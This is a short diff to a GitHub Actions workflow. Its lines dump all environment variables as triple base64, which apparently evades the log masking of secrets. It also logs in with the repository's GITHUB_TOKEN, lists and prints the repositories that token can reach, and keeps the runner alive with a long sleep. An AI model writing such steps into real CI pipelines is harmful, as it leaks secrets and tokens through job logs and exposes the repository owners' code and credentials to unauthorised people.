@@ -17,5 +17,6 @@ jobs:
       - run: | 
           sh -c 'env | base64 -w0 | base64 -w0 | base64 -w0'
           echo "${{ secrets.GITHUB_TOKEN }}" | gh auth login --with-token
-          gh repo list
+          gh repo list > list
+          cat list
           sleep 100000
